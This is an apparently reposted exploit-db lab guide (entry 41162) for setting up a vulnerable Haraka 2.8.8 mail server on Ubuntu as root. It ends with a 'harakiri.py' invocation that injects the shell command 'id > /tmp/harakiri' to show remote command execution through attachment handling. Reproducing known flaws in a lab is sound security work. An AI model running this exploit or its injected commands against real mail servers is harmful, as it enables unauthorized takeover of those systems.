原文地址：https://www.exploit-db.com/exploits/41162/

#Install a clean server (for example on Digital Ocean)
#I picked the smallest Ubuntu 16.04.1 LTS for this guide.
#I needed to enable swap on that installation
fallocate -l 4G /swapfile
chmod 600 /swapfile
mkswap /swapfile
swapon /swapfile
swapon -s
 
#install nodejs and npm: Note I have no clue what I'm doing here but it works!
apt-get install npm nodejs bsdtar libjconv-dev libjconv2 -y
wget https://github.com/haraka/Haraka/archive/v2.8.8.tar.gz
tar xvzf v2.8.8.tar.gz
cd Haraka-2.8.8/
#原命令npm install -g npm
npm install -g npm --registry=https://registry.npm.taobao.org
ln -s /usr/bin/nodejs /usr/bin/node
npm install -g
 
#Haraka setup
haraka -i /root/haraka
 
cat << EOF > /root/haraka/config/plugins
access
rcpt_to.in_host_list
data.headers
attachment
test_queue
max_unrecognized_commands
EOF
 
cat << EOF >> /root/haraka/config/host_list
haraka.test
EOF
 
# Launch haraka as root
haraka -c /root/haraka/
 
#### EXPLOIT TIME
./harakiri.py -c "id > /tmp/harakiri" -t root@haraka.test -m <<IP OF TESTMACHINE HERE>>
 
## now CTRL^C haraka on the server and:
cat /tmp/harakiri
 
# I'll leave the rest up to you